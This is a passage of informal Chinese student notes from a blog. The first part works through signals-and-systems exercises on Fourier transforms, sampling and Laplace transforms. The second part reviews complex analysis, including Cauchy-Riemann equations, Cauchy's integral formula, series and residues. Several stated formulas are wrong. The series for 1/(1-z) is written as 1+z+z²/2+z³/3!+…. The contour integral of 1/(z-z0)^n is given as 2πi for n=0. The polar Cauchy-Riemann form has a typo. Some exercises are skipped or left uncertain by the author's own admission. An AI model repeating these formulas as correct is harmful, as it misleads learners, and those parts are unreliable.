\\int_{-\\infty}^{+\\infty} x(\\tau)z(t-\\tau) d\\tau - x(t)$$ 其中 $z(t) = e^{-t}u(t) + 3\\delta(t)$。 (a) 求该系统的频率响应$H(\\mathrm{j}\\omega) = \\frac{Y(\\mathrm{j}\\omega)}{X(\\mathrm{j}\\omega)}$。注意到积分部分就是 $x(t)*z(t)$，又由卷积性质 $x(t)*z(t) \\stackrel{\\mathcal{F}}{\\longleftrightarrow} X(\\mathrm{j}\\omega)Z(\\mathrm{j}\\omega)$，所以$$\\mathrm{j}\\omega Y(\\mathrm{j}\\omega) + 10Y(\\mathrm{j}\\omega) = X(\\mathrm{j}\\omega)Z(\\mathrm{j}\\omega) - X(\\mathrm{j}\\omega)$$又 $Z(\\mathrm{j}\\omega) = \\frac{1}{1 + \\mathrm{j}\\omega} + 3$，所以直接代进去就可以算出$$H(\\mathrm{j}\\omega) = \\frac{3+2\\mathrm{j}\\omega}{(1+\\mathrm{j}\\omega)(10+\\mathrm{j}\\omega)}$$ (b) 求该系统的单位冲激响应。 求逆变换即可得到单位冲激响应$$h(t) = \\frac19e^{-t}u(t) + \\frac{17}{9}e^{-10t}u(t)$$ 第五章 离散时间傅里叶变换习题 5.1利用傅里叶变换分析公式(5.9)，计算下列傅里叶变换：(a) $\\left(\\frac{1}{2}\\right)^{n-1}u[n-1]$(b) $\\left(\\frac{1}{2}\\right)^{|n-1|}$ 概略画出每个傅里叶变换在一个周期内的模，并给以标注。 习题 5.2利用傅里叶变换分析公式(5.9)，计算下列傅里叶变换：(a) $\\delta[n-1] + \\delta[n+1]$(b) $\\delta[n+2] - \\delta[n-2]$ 概略画出每个傅里叶变换在一个周期内的模，并给以标注。 习题 5.13一个单位脉冲响应为 $h_1[n]=\\left(\\frac{1}{3}\\right)^n u[n]$ 的线性时不变系统与另一单位脉冲响应为 $h_2[n]$ 的因果线性时不变系统并联，并联后的频率响应为$$H(e^{\\mathrm{j}\\omega}) = \\frac{-12 + 5e^{-\\mathrm{j}\\omega}}{12 - 7e^{-\\mathrm{j}\\omega} + e^{-\\mathrm{j}2\\omega}}$$求$h_2[n]$。 习题 5.18已知$$ a^n \\stackrel{\\mathcal{F}}{\\longleftrightarrow} \\frac{1-a^2}{1-2a \\cos \\omega + a^2}, \\quad |a| &lt; 1 $$ 利用对偶性求下面周期 $T=1$ 的连续时间信号的傅里叶级数系数：$$ x(t) = \\frac{1}{5 - 4 \\cos (2 \\pi t)} $$ 习题 5.21(a) $x[n] = u[n-2] - u[n-6]$ (c) $x[n] = \\left(\\frac{1}{3}\\right)^{|n|} u[-n-2]$ (g) $x[n] = \\sin\\left(\\frac{\\pi}{2} n\\right) + \\cos(n)$ 第六章 信号与系统的时域特性和频域特性习题 6.1考虑一个频率响应为 $H(\\mathrm{j}\\omega) = |H(\\mathrm{j}\\omega)| e^{\\mathrm{j}\\sphericalangle H(\\mathrm{j}\\omega)}$ 且实值单位冲激响应为 $h(t)$ 的连续时间线性时不变系统。假设在该系统上施加一个输入 $x(t) = \\cos(\\omega_0 t + \\phi_0)$，所得到的输出可表示成如下形式：$$y(t) = A x(t - t_0)$$ 其中 $A$ 是一个非负实数，代表一个幅度放大因子，$t_0$ 是一个延时。 (a) 用 $|H(\\mathrm{j}\\omega)|$ 表示 $A$； (b) 用 $\\sphericalangle H(\\mathrm{j}\\omega)$ 表示 $t_0$。 习题 6.5考虑一个连续时间理想带通滤波器，其频率响应为$$H(\\mathrm{j}\\omega) =\\begin{cases}1, &amp; \\omega_c \\leqslant |\\omega| \\leqslant 3\\omega_c \\\\0, &amp; \\text{其他}\\end{cases}$$(a) 若 $h(t)$ 是该滤波器的单位冲激响应，确定一个函数 $g(t)$，使之有$$ h(t) = \\left( \\frac{\\sin \\omega_c t}{\\pi t} \\right) g(t) $$ (b) 当 $\\omega_c$ 增加时，该滤波器的单位冲激响应是更加向原点集中呢，还是不是？ 习题 6.7 一个连续时间低通滤波器设计成通带频率为 1000 Hz，阻带频率为 1200 Hz，通带纹波为 0.1，阻带纹波为 0.05。该低通滤波器的单位冲激响应为 $ h(t) $，现在希望把该滤波器转换成具有如下单位冲激响应的带通滤波器： $$ g(t) = 2h(t) \\cos(4000 \\pi t) $$ 假设对于 $| \\omega | &gt; 4000 \\pi$，$ | H(\\mathrm{j} \\omega) |$ 可忽略，请回答下列问题： (a) 若对该带通滤波器的通带波纹限制为 0.1，与带通滤波器有关的两个通带频率是什么？ (b) 若对该带通滤波器的阻带波纹限制为 0.05，与带通滤波器有关的两个阻带频率是什么？ 习题 6.23 示于图 P6.23 的是一个低通滤波器的 $|H(\\mathrm{j}\\omega)|$。对于具有下列每一相位特性的滤波器，求并画出其单位冲激响应。 (a) $\\sphericalangle H(\\mathrm{j}\\omega) = 0$ (b) $\\sphericalangle H(\\mathrm{j}\\omega) = \\omega T$，其中 $ T $ 为常数。 (c)$$\\sphericalangle H(\\mathrm{j}\\omega) =\\begin{cases}\\frac{\\pi}{2}, &amp; \\omega &gt; 0 \\\\-\\frac{\\pi}{2}, &amp; \\omega &lt; 0\\end{cases}$$ 第七章 采样习题 7.22信号 $Y(t)$ 由两个均为带限的信号 $x_1(t)$ 和 $x_2(t)$ 卷积而成，即 $y(t)=x_1(t)*x_2(t)$，其中，$X_1(\\mathrm{j}\\omega)=0, |\\omega| &gt; 1000\\pi$，$X_2(\\mathrm{j}\\omega)=0, |\\omega| &gt; 2000\\pi$。现对 $Y(t)$ 进行激串采样，以得到 $y_p(t)=\\sum^{+\\infty}_{n=-\\infty}y(nT)\\delta(t-nT)$，试给出 $y(t)$ 保证能从 $y_p(t)$ 恢复出来的采样周期 T 的范围。因 $y(t)=x_1(t)*x_2(t)$，所以 $Y(\\mathrm{j}\\omega)=X_1(\\mathrm{j}\\omega)\\cdot X_2(\\mathrm{j}\\omega)$，又当 $|\\omega| &gt; 1000\\pi$ 时 $X_1(\\mathrm{j}\\omega)=0$，当 $|\\omega| &gt; 2000\\pi$ 时 $X_2(\\mathrm{j}\\omega)=0$，所以当 $|\\omega| &gt; 1000\\pi$ 时 $Y(\\mathrm{j}\\omega)=0$。由采样定理知，若采样频率 $\\omega_s&gt;2\\times1000\\pi$，即 $T&lt;\\frac{2\\pi}{2\\pi\\times10^3}=10^{-3}$ 时，$y(t)$ 可以从 $y_p(t)$ 恢复出来。这里我也不是很清楚采样定理，后面有机会再补。 习题 7.26挺复杂的，不看了。 习题 8.22不知道为啥第七章作业会布置第八章的题目。 第八章 通信系统没学，不用考，嘻嘻。 第九章 拉普拉斯变换习题 9.21确定下列时间函数的拉普拉斯变换、收敛域及零-极点图。零点就是分子为 0 的点，极点就是分母为 0 的点。画图时零点处画圆圈，极点处画叉号，x 轴为实轴，y 轴为虚轴。本题多处利用变换对 $e^{-\\alpha t}u(t)\\leftrightarrow\\frac{1}{s+\\alpha}, \\mathrm{Re}\\lbrace s\\rbrace &gt; \\mathrm{Re}\\lbrace -\\alpha\\rbrace$，$\\alpha$ 可为复数。(a) $x(t)=e^{-2t}u(t)+e^{-3t}u(t)$直接由变换对得出 $X(s)=\\frac{1}{s+2}+\\frac{1}{s+3}= \\frac{2s+5}{(s+2)(s+3)}, \\mathrm{Re}\\lbrace s\\rbrace &gt; -2$，零点 $s=-\\frac52$，极点 $s=-2, -3$，收敛域就是 $x &gt; -2$，要画虚线。(c) $x(t)=e^{2t}u(-t)+e^{3t}u(-t)$由变换对 $-e^{-\\alpha t}u(-t)\\leftrightarrow\\frac{1}{s+\\alpha}, \\mathrm{Re}\\lbrace s\\rbrace &lt; \\mathrm{Re}\\lbrace -\\alpha\\rbrace$，得 $X(s)=-\\frac{1}{s-2}-\\frac{1}{s-3}= \\frac{5-2s}{(s-2)(s-3)}, \\mathrm{Re}\\lbrace s\\rbrace &lt; 2$，零点 $s=\\frac52$，极点 $s=2, 3$，收敛域为 $x &lt; 2$。 习题 9.22对下列每个拉普拉斯变换，确定时间函数 $x(t)$：概念：使拉氏变换积分收敛的那些复数 S 的集合，称为拉氏变换的收敛域 ROC (Region of Convergence)。(a) $\\frac{1}{s^2+9}, \\mathrm{Re}\\lbrace s\\rbrace &gt; 0$$\\sin(\\omega_0t)u(t)\\leftrightarrow\\frac{\\omega_0}{s^2+\\omega_0^2}, \\mathrm{Re}\\lbrace s\\rbrace &gt; 0$，又 $\\frac{1}{s^2+9}= \\frac{1}{3}\\frac{3}{s^2+3^2}$，所以 $x(t)=\\frac13\\sin(3t)u(t)$。(b) $\\frac{s}{s^2+9}, \\mathrm{Re}\\lbrace s\\rbrace &lt; 0$$\\cos(\\omega_0t)u(t)\\leftrightarrow\\frac{s}{s^2+\\omega_0^2}, \\mathrm{Re}\\lbrace s\\rbrace &gt; 0$，这里注意 ROC &gt; 0，所以还要又由拉普拉斯变换的时域反褶性质：$x(-t)\\leftrightarrow X(-s), \\mathrm{ROC} = -R$有 $-\\cos(-\\omega_0t)u(-t)\\leftrightarrow\\frac{s}{s^2+\\omega_0^2}, \\mathrm{Re}\\lbrace s\\rbrace &lt; 0$，所以 $x(t) = -\\cos(3t)u(-t)$。(d) $\\frac{s+2}{s^2+7s+12}, -4 &lt; \\mathrm{Re}\\lbrace s\\rbrace &lt; -3$拆成 $\\frac{-1}{s+3}+\\frac{2}{s+4}$，再由题 9.11 的变换对得出 $x(t)=e^{-3t}u(-t)+2e^{-4t}u(t)$。(e) $\\frac{s+1}{s^2+5s+6}, -3 &lt; \\mathrm{Re}\\lbrace s\\rbrace &lt; -2$类似上题，拆成 $\\frac{-1}{s+2}+\\frac{2}{s+3}$，得出 $x(t)=e^{-2t}u(-t)+2e^{-3t}u(t)$。 习题 9.31有一个连续时间线性时不变系统，其输入 $x(t)$ 和输出 $y(t)$ 由下列微分方程所关联：$$\\frac{\\mathrm{d}^2y(t)}{\\mathrm{d}t^2}-\\frac{\\mathrm{d}y(t)}{\\mathrm{d}t}-2y(t)=x(t)$$(a) 求 $H(s)$ 作为 $s$ 的两个多项式之比，画出 $H(s)$ 的零极点图。对微分方程取拉普拉斯变换，得到 $(s^2-s-2)Y(s)=X(s)$，于是系统函数 $H(s)$ 的表达式为$$H(s)=\\frac{Y(s)}{X(s)}=\\frac{1}{s^2-s-2}=\\frac{1}{(s-2)(s+1)}=\\frac{1}{3}\\left(\\frac{1}{s-2}-\\frac{1}{s+1}\\right)$$无零点，极点为 $s=2, -1$。(b) 对下列每一种情况求 $h(t)$：求 $h(t)$ 就要对 $H(s)$ 进行逆变换，就需要 $H(s)$ 的 ROC。(i) 系统是稳定的。如果 LTI 系统是稳定的，则系统函数的 ROC 必然包括 $\\mathrm{j}\\omega$ 轴。ROC 为 $-1 &lt; \\mathrm{Re}\\lbrace s\\rbrace &lt; 2$，所以 $h(t)=-\\frac13e^{2t}u(-t)-\\frac13e^{-t}u(t)$(ii) 系统是因果的。**如果 LTI 系统是因果的，则系统函数的 ROC 是最右边极点的右边。**ROC 为 $\\mathrm{Re}\\lbrace s\\rbrace &gt; 2$，所以 $h(t)=\\frac13(e^{2t}-e^{-t})u(t)$(iii) 系统既不是稳定的，也不是因果的。ROC 为 $\\mathrm{Re}\\lbrace s\\rbrace &lt; -1$，所以 $h(t)=-\\frac13(e^{2t}-e^{-t})u(-t)$ 习题 9.35给了一个因果线性时不变系统的输入 $x(t)$ 和输出 $y(t)$ 的方框图(a) 求联系 $y(t)$ 和 $x(t)$ 的微分方程。对 $x(t)$ 遇到的第一个加法器进行分析，容易看出关系是：左 + 下 = 右左 = $X(s)$，设右边为 $p(t)$，则右 = $P(s)$，下 = $-2\\cdot\\frac1sP(s)-\\frac1{s^2}P(s)$代入得到第一条式子如下：$$-2\\cdot\\frac1sP(s)-\\frac1{s^2}P(s) + X(s) = P(s)$$再对 $y(t)$ 之前的加法器进行分析，容易看出关系也是：左 + 下 = 右得到第二条式子如下：$$-\\frac1sP(s)-6\\cdot\\frac1{s^2}P(s)+P(s)=Y(s)$$联立消去 $P(s)$ 得到：$$\\left(1 + \\frac{2}{s} + \\frac{1}{s^2}\\right) Y(s) = \\left(1 - \\frac{1}{s} - \\frac{6}{s^2}\\right) X(s)$$即$$(s^2 + 2s + 1)Y(s) = (s^2 - s - 6)X(s)$$取拉普拉斯逆变换得到微分方程：$$\\frac{\\mathrm{d}^2y(t)}{\\mathrm{d}t^2} + 2\\frac{\\mathrm{d}y(t)}{\\mathrm{d}t} + y(t) = \\frac{\\mathrm{d}^2x(t)}{\\mathrm{d}t^2} - \\frac{\\mathrm{d}x(t)}{\\mathrm{d}t} - 6x(t)$$(b) 该系统是稳定的吗？系统函数 $H(s)=\\frac{Y(s)}{X(s)}=\\frac{s^2-s-6}{s^2+2s+1}=\\frac{(s-3)(s+2)}{(s+1)^2}$，有二阶极点 $s=-1$，题目说系统是因果的，那么 ROC 是最右极点的右边，即 $\\mathrm{Re}\\lbrace s\\rbrace &gt; -1$，包含了 $\\mathrm{j}\\omega$ 轴，所以系统是稳定的。 习题 9.36输入为 $x(t)$，输出为 $y(t)$ 的系统的系统函数为 $H(s)=\\frac{Y(s)}{X(s)}=\\frac{2s^2+4s+6}{s^2+3s+2}$，输入为 $x(t)$，输出为 $y_1(t)$ 的系统的系统函数为 $H_1(s)=\\frac{Y_1(s)}{X(s)}=\\frac{1}{s^2+3s+2}$，还给了系统 $S_1$ 的方框图(a) 将 $y(t)$（系统 $S$ 的输出）表示成 $y_1(t)$，$\\frac{\\mathrm{d}y_1(t)}{\\mathrm{d}t}$ 和 $\\frac{\\mathrm{d}^2 y_1(t)}{\\mathrm{d}t^2}$ 的线性组合。由 $H(s)$ 和 $H_1(s)$ 的关系，有 $Y(s)=(2s^2+4s-6)Y_1(s)$，两边取拉普拉斯逆变换得到$$y(t)=2\\frac{\\mathrm{d}^2y_1(t)}{\\mathrm{d}t^2}+4\\frac{\\mathrm{d}y_1(t)}{\\mathrm{d}t}-6y_1(t)$$(b) $\\frac{\\mathrm{d}y_1(t)}{\\mathrm{d}t}$ 是如何与 $f(t)$ 相关联的？由图可知 $Y_1(s)=\\frac{F(s)}{s}$，所以 $f(t)=\\frac{\\mathrm{d}y_1(t)}{\\mathrm{d}t}$(c) $\\frac{d^2 y_1(t)}{\\mathrm{d}t^2}$ 是如何与 $e(t)$ 相关联的？由图可知 $F(s)=\\frac{E(s)}{s}$，所以 $e(t)=\\frac{\\mathrm{d}f(t)}{\\mathrm{d}t}=\\frac{\\mathrm{d}^2y_1(t)}{\\mathrm{d}t^2}$(d) 将 $y(t)$ 表示成 $e(t)$，$f(t)$ 和 $y_1(t)$ 的线性组合。由前三问可知 $y(t)=2e(t)+4f(t)-6y_1(t)$(e) 利用前面部分的结果将 $S_1$ 的直接型方框图表示推广，形成 $S$ 的方框图表示。根据上面式子，用乘法器连接 $e(t)$、$f(t)$ 和 $y_1(t)$，再用加法器连接乘法器的输出，即可得到 $S$ 的方框图。(f) 注意到$$H(s) = \\left( \\frac{2(s - 1)}{s + 2} \\right) \\left( \\frac{s + 3}{s + 1} \\right)$$画出将 $S$ 作为两个子系统级联的方框图表示。这里答案少了一个乘三，读者可自行验算。(g) 注意到$$H(s) = 2 + \\frac{6}{s + 2} - \\frac{8}{s + 1}$$画出将 $S$ 作为三个子系统并联的方框图表示。上面三题的解题核心就是加法器和乘法器的运用，一个关键的点就是 $1/s$ 和一个常数 $n$ 乘法器再用加法器与输入相加组成的回路（如下图），该系统的系统函数为 $H(s)=\\frac{1}{s+n}$，加法器输出处系统函数是 $\\frac{s}{s+n}$。 123x(t)--- + --- 1/s -------y(t) | | ------ n -----","link":"/2024/06/21/%E4%BF%A1%E5%8F%B7%E4%B8%8E%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0/"},{"title":"复变函数笔记","text":"高数写了笔记再考试效果挺好的 （为什么挂科之前没这觉悟啊），复变也记一下吧 复数与复变函数复数及其运算通常记复数为 $z=x+\\mathrm{i}y$ ，其中实部与虚部记作$$x=\\mathrm{Re}(z),\\quad y=\\mathrm{Im}(z)$$显然$$\\mathrm{Re}(z)=\\frac{z+\\overline{z}}{2},\\quad \\mathrm{Im}(z)=\\frac{z-\\overline{z}}{2\\mathrm{i}}$$以正实轴为始边，以 $z(z\\neq 0)$ 所对应的向量为终边的角称为复数 $z$ 的辐角，记作 $\\mathrm{Arg}\\ z$ ，把在 $(-\\pi,\\pi]$ 之间的辐角称为 $z$ 的主辐角（或主值或者叫辐角主值），记作 $\\mathrm{arg}\\ z$ 。有个重要点就是辐角要注意正负。 以及大名鼎鼎的欧拉公式：$$e^{\\mathrm{i}\\theta}=\\cos\\theta+\\mathrm{i}\\sin\\theta$$ 一个没什么名但是很有用的公式——棣莫弗公式：$$z^n = \\cos n\\theta + \\mathrm{i}\\sin n\\theta$$ 复数的开方复数开方时，开几次方就有几个结果。求 $w=\\sqrt[n]{z}$ 时，令 $w=\\rho e^{\\mathrm{i}\\varphi}$ ，从而 $\\rho^n e^{\\mathrm{i}n\\varphi} = z = re^{\\mathrm{i}\\theta}$ ，得到$$\\rho^n = r,\\quad n\\varphi = \\theta + 2k\\pi,\\quad k=0,\\pm1,\\pm2,\\cdots$$故$$\\rho = r^{1/n},\\quad \\varphi = \\frac{\\theta + 2k\\pi}{n}$$于是$$w = \\sqrt[n]{r}e^{\\mathrm{i}\\frac{\\theta + 2k\\pi}{n}}$$ 平面点集的一般概念和高数类似，没啥好说的。 复变函数似乎也没啥重要的（） 解析函数解析函数的概念与柯西-黎曼方程奇点：如果函数 $f(z)$ 在点 $z_0$ 不解析，则称 $z_0$ 为 $f(z)$ 的奇点。求有理分式的奇点时，直接取分母零点即可。 柯西-黎曼方程（C-R方程）：$$\\frac{\\partial u}{\\partial x} = \\frac{\\partial v}{\\partial y},\\quad \\frac{\\partial u}{\\partial y} = -\\frac{\\partial v}{\\partial x}$$ 可导的充要条件： $u(x,y)$ 和 $v(x,y)$ 在点 $x,y$ 可微，且在该点满足C-R方程。 例 证明：柯西-黎曼方程的极坐标形式是$$\\frac{\\partial u}{\\partial r} = \\frac{1}{r}\\frac{\\partial v}{\\partial \\theta},\\quad \\frac{\\partial v}{\\partial r} = -\\frac{1}{r}\\frac{\\partial r}{\\partial \\theta}$$ 初等函数及其解析性指数函数 $z=x+\\mathrm{i}y$ 为任意复数，称 $w=e^z=e^x(\\cos y+\\mathrm{i}\\sin y)$ 为指数函数。 对数函数 满足方程 $e^w = z$ 的函数 $w=\\mathrm{Ln} \\ z$ 称为对数函数，且$$\\mathrm{Ln}\\ z = \\ln z + 2k\\pi\\mathrm{i} = \\ln|z| + \\mathrm{i}\\mathrm{arg}\\ z + 2k\\pi\\mathrm{i},\\quad k=0,\\pm1,\\pm2,\\cdots$$ 幂函数 $w=z^a=e^{a\\mathrm{Ln}\\ z}$ 为幂函数。 三角函数 称 $\\sin z = \\frac{e^{\\mathrm{i}z}-e^{-\\mathrm{i}z}}{2\\mathrm{i}}$ 为正弦函数， $\\cos z = \\frac{e^{\\mathrm{i}z}+e^{-\\mathrm{i}z}}{2}$ 为余弦函数。 双曲函数 称 $\\sinh z = \\frac{e^z-e^{-z}}{2}$ 为双曲正弦函数， $\\cosh z = \\frac{e^z+e^{-z}}{2}$ 为双曲余弦函数。 解析函数与调和函数的关系若实二元函数 $\\varphi(x,y)$ 在区域 $D$ 内具有二阶连续偏导数，且满足 $\\mathrm{Laplace}$ 方程$$\\frac{\\partial^2\\varphi}{\\partial x^2} + \\frac{\\partial^2\\varphi}{\\partial y^2} = 0$$则称 $\\varphi(x,y)$ 为区域 $D$ 的调和函数。 例 验证 $u(x,y)=x^3-3xy^2$ 为调和函数，并求以 $u(x,y)$ 为实部的解析函数 $f(z)$ ，使得 $f(\\mathrm{i}) = -\\mathrm{i}$ 。 解 $u_{xx}=6x$，$u_{yy}=-6y$，故 $u_{xx}+u_{yy}=0$， $u(x,y)$ 为调和函数。下面求虚部 $v(x,y)$ 。法一：偏积分法$$u_x = 3x^2-3y^2 = v_y \\Rightarrow v = \\int (3x^2-3y^2)\\mathrm{d}y = 3x^2y-y^3 + \\varphi(x) \\\\v_x = 6xy+\\varphi’(x) = -u_y = 6xy \\Rightarrow \\varphi(x) = C \\Rightarrow v(x,y) = 3x^2y - y^3 + C$$ 法二：全微分法$$v_y=u_x=3x^2-3y^2,v_x=-u_y=6xy\\\\\\Rightarrow \\mathrm{d}v = v_x’\\mathrm{d}x +v_y’\\mathrm{d}y=6xy\\mathrm{d}x + (3x^2-3y^2)\\mathrm{d}y\\\\\\Rightarrow v(x,y)=\\int_{(0,0)}^{(x,y)}6xy\\mathrm{d}x+(3x^2-3y^2)\\mathrm{d}y + C \\\\=\\int_0^x\\mathrm{d}x+\\int_0^y(3x^2-3y^2)\\mathrm{d}y + C = 3x^2y - y^3 + C$$ 最后代入 $f(\\mathrm{i})=-\\mathrm{i}$ 有 $f(z)=(x^3-3xy^2)+\\mathrm{i}(3x^2y-y^3)=z^3$ 。 复变函数的积分复变函数积分的概念例 计算 $I=\\oint_{\\mathit{\\Gamma}}\\frac{1}{(z-z_0)^n}\\mathrm{d}z$ ，其中 $\\mathit{\\Gamma}$ 为包含 $z_0$ 的一条闭曲线。解 以 $z_0$ 为圆心 $r$ 为半径作圆，则函数 $f(z)=\\frac{1}{(z-z_0)^n}$ 在 $\\overline{D}=D+\\mathit{\\Gamma}+C^-$上解析，因此$$I = \\oint_C\\frac{\\mathrm{d}z}{(z-z_0)^n}\\mathrm{d}z= \\begin{cases}2\\pi\\mathrm{i}, &amp; n = 0 \\\\0, &amp; n\\neq0\\end{cases}$$ 柯西积分定理设函数 $f(z)$ 在单连通域 $D$ 内解析， $\\mathit{\\Gamma}$ 为 $D$ 内的任意一条简单闭曲线，则有$$\\oint_{\\mathit{\\Gamma}}f(z)\\mathrm{d}z=0$$甚至也不用在$ \\mathit{\\Gamma}$ 上解析，在 $\\mathit{\\Gamma}$ 上连续就成立。 复合闭路定理设多连域 $D$ 的边界为 $C=C_0 + C_1^- + C_2^- + \\cdots + C_n^-$ ，函数 $f(z)$ 在 $D$ 内解析，在 $C$ 上连续，则$$\\oint_Cf(z)\\mathrm{d}z = 0$$或$$\\oint_{C_0}f(z)\\mathrm{d}z = \\sum_{k=1}^n\\oint_{C_k}f(z)\\mathrm{d}z$$ 柯西积分公式柯西积分公式 若函数 $f(z)$ 在简单正向闭曲线 $C$ 所围成的区域 $D$ 内解析，在区域 $D$ 的边界 $C$ 上连续， $z_0$ 是区域 $D$ 内任意一点，则$$f(z_0) = \\frac{1}{2\\pi\\mathrm{i}}\\oint_C\\frac{f(z)}{z-z_0}\\mathrm{d}z$$ 高阶求导公式 设 $f(z)$ 在 $D$ 内解析，在 $D$ 的边界 $C$ 上连续， $C$ 为正向简单闭曲线，则 $f^{(n)}(z)$ 在 $D$ 内解析，且有$$f^{(n)}(z_0)=\\frac{n!}{2\\pi\\mathrm{i}}\\oint_C\\frac{f(z)}{(z-z_0)^{n+1}}\\mathrm{d}z, \\quad \\forall z_0\\in D, n=0,1,2,\\cdots$$ 解析函数的幂级数表示复级数的基本概念复数列收敛和一般的数列收敛定义类似，其充要条件为$$\\lim_{n\\to\\infty}a_n=a,\\quad \\lim_{n\\to\\infty}b_n=b$$所以判断级数收不收敛就拆成实部和虚部然后进行判断。 幂级数收敛半径 求法与高数类似，但多个根值法：（1）（比值法） $\\lim\\limits_{n\\to\\infty}\\left|\\frac{a_{n+1}}{a_n}\\right|=L$（2）（根值法） $\\lim\\limits_{n\\to\\infty}\\sqrt[n]{|a_n|}=L$则收敛半径 $R=\\frac{1}{L}$ 幂级数性质与高数也类似，可以逐项求导和逐项求积。 解析函数的泰勒展开与高数类似，不再赘述。 四个重要的已知展开$$\\frac{1}{1-z} = \\sum_{n=0}^\\infty z^n = 1+z+\\frac{z^2}{2}+\\frac{z^3}{3!}+\\cdots,\\enspace |z| &lt; 1 \\\\e^z = \\sum_{n=0}^\\infty \\frac{z^n}{n!} = 1+z+\\frac{z^2}{2!}+\\frac{z^3}{3!}+\\cdots,\\enspace |z| &lt; +\\infty \\\\\\sin z = \\sum_{n=0}^\\infty \\frac{(-1)^nz^{2n+1}}{(2n+1)!} = z-\\frac{z^3}{3!}+\\frac{z^5}{5!}-\\frac{z^7}{7!}+\\cdots,\\enspace |z| &lt; +\\infty \\\\\\cos z = \\sum_{n=0}^\\infty \\frac{(-1)^nz^{2n}}{(2n)!} = 1-\\frac{z^2}{2!}+\\frac{z^4}{4!}-\\frac{z^6}{6!}+\\cdots,\\enspace |z| &lt; +\\infty$$ 展开后注意标出收敛圆！ 洛朗级数泰勒展开有个缺陷，那就是只能展开到解析的地方，如果中间有个奇点卡住，那就不能再往外展开了。这个时候就用到洛朗级数，可以在圆环域展开，弥补泰勒展开的不足。 留数及其应用孤立奇点零点的判断首先很直白的， $f(z_0)=0$ ，那么 $z=z_0$ 就是 $f(z)$ 的零点。若 $f(z)=(z-z_0)^m\\varphi(z)$ ， $\\varphi(z)$ 在 $z_0$ 处解析且 $\\varphi(z_0)\\neq 0$ ，则 $z=z_0$ 是 $f(z)$ 的 $m$ 阶零点。 奇点类型的判断从定义上判断的话就先展开成洛朗级数，即设 $z_0$ 为 $f(z)$ 的孤立奇点，将 $f(z)$ 在 $0 &lt; |z-Z_0| &lt; \\delta$ 内洛朗展开为 $f(z)=\\sum\\limits_{n=0}^{+\\infty} a_n(z-z_0)^n$ 。 可去奇点：展开式中不含负幂次项，直观上看就是 $\\lim\\limits_{z\\to z_0}f(z)=C$ 。 $N$ 阶极点：含有限多的负幂次项，且最高负幂次为 $N$ ，直观上看就是 $\\lim\\limits_{z\\to z_0}f(z)=\\infty$。 本性奇点：含无穷多的负幂次项，直观上看就是 $\\lim\\limits_{z\\to z_0}f(z)$ 不存在且不为 $\\infty$ 。 留数留数的定义设 $z_0$ 为函数 $f(z)$ 的孤立奇点，将 $f(z)$ 在 $z_0$ 的去心邻域内展开成洛朗级数$$f(z) = \\sum_{n=-\\infty}^{+\\infty}a_n(z-z_0)^n = \\cdots + a_{-2}(z-z_0)^{-2} + a_{-1}(z-z_0)^{-1} + a_0 + a_1(z-z_0) + a_2(z-z_0)^2 + \\cdots$$称 $a_{-1}$ 为 $f(z)$ 在 $z_0$ 处的留数，记作$$\\mathrm{Res}[f(z),z_0]=a_{-1}=\\frac{1}{2\\pi i}\\oint\\limits_c f(z)\\mathrm{d}z$$其中 $C$ 是 $z_0$ 的去心邻域内绕 $z_0$ 的一条简单闭曲线。 留数的求解 $z_0$ 为可去奇点： $\\mathrm{Res}[f(z),z_0]=0$ 。 $z_0$ 为本性奇点：需要将$f(z)$在$z_0$的去心邻域内展开成洛朗级数 $z_0$ 为 $m$ 阶极点：$$\\mathrm{Res}[f(z),z_0]=\\frac{1}{(m-1)!}\\lim_{z\\to z_0}\\frac{d^{m-1}}{dz^{m-1}}[(z-z_0)^mf(z)]$$ 无穷远处的留数若函数 $f(z)$ 在无穷远点 $\\infty$ 的去心领域 $R&lt;|f(z)|&lt;+\\infty$ 内解析，则称点 $\\infty$ 为 $f(z)$ 的孤立奇点。 设函数 $f(z)$ 在圆环域 $R&lt;|z|&lt;+\\infty$ 内解析，则 $f(z)$ 在 $\\infty$ 处的留数为：$$\\mathrm{Res}[f(z),\\infty]=\\frac{1}{2\\pi \\mathrm{i}}\\oint_{C^-}f(z)\\mathrm{d}z$$其中， $C$ 为 $|z|=\\rho &gt; R$ 。 $$\\mathrm{Res}[f(z), \\infty] = -\\mathrm{Res}[f(\\frac{1}{z})\\cdot\\frac{1}{z^2}, 0]$$ 利用留数计算实积分形如 $\\int_0^{2\\pi}R(\\cos\\theta,\\sin\\theta)\\mathrm{d}\\theta$ 的积分计算方法： 令 $z=e^{\\mathrm{i}\\theta}=\\cos\\theta+\\mathrm{i}\\sin\\theta$ ，则 $\\mathrm{d}\\theta=\\frac{\\mathrm{d}z}{\\mathrm{i}z}$ ， $\\cos\\theta=\\frac{z^2+1}{2z}$ ， $\\sin\\theta=\\frac{z^2-1}{2\\mathrm{i}z}$ 。 $\\int_0^{2\\pi}R(\\cos\\theta,\\sin\\theta)\\mathrm{d}\\theta=\\oint_{|z|=1}R\\left(\\frac{z^2+1}{2z},\\frac{z^2-1}{2\\mathrm{i}z}\\right)\\frac{1}{\\mathrm{i}z}\\mathrm{d}z=\\oint_{|z|=1}f(z)\\mathrm{d}z=2\\pi\\mathrm{i}\\sum\\limits_k \\mathrm{Res}[f(z),z_k]$ ，其中 $z_k$ 是 $f(z)$ 在 $|z|=1$ 内的孤立奇点。 形如 $\\int^{+\\infty}_{-\\infty}R(x)\\mathrm{d}x$ 的积分要求： $R(x)=\\frac{P(x)}{Q(x)}$ ，其中 $P(x)$ 和 $Q(x)$ 为多项式，且 $Q(x)$ 无实零点。 分母 $Q(x)$ 的次数比分子 $P(x)$ 的次数高 $2$ 或以上。 计算方法： $\\int^{+\\infty}_{-\\infty}R(x)\\mathrm{d}x=2\\pi\\mathrm{i}\\sum\\limits_k\\mathrm{Res}[R(z),z_k]$ ， 其中 $z_k$ 为 $R(z)$在上半平面内的孤立奇点。 例 求积分 $I=\\int_{-\\infty}^{+\\infty}\\frac{x^2-x+2}{x^4+10x^2+9}\\mathrm{d}x$ .解 首先显然分母零点均为虚数，且分母次数比分子高 $2$ ，故满足条件。 令 $$R(z)=\\frac{z^2-z+2}{z^4+10z^2+9}=\\frac{z^2-z+2}{(z^2+1)(z^2+9)}$$则上半平面内有一阶极点 $z_1=\\mathrm{i}$ 和 $z_2=3\\mathrm{i}$ 。 